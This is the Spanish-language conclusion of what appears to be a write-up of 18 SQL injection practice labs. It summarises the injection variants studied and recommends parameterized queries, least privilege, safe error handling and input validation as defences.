El desarrollo de los 18 laboratorios permitió demostrar cómo SQL Injection puede ser explotada en múltiples variantes —In-band, Blind, Out-of-Band y WAF Bypass— dependiendo de las condiciones del entorno. Desde técnicas directas como UNION hasta métodos indirectos como inferencia booleana, retardo temporal y exfiltración DNS, cada laboratorio evidenció un escenario real de vulnerabilidad.

A lo largo del proceso quedó claro que la causa raíz siempre es la misma: concatenar datos de usuario directamente en consultas SQL sin validación. Independientemente del motor de base de datos (Oracle, PostgreSQL, MySQL, MSSQL) o la sofisticación del ataque, la defensa definitiva es consistente: consultas parametrizadas, complementadas por principio de menor privilegio, manejo seguro de errores y validación de entradas.

La práctica también demostró la importancia de herramientas como Burp Suite —Proxy, Repeater e Intruder— para el análisis y automatización de pruebas en un entorno controlado, habilidades esenciales para cualquier profesional de seguridad informática.
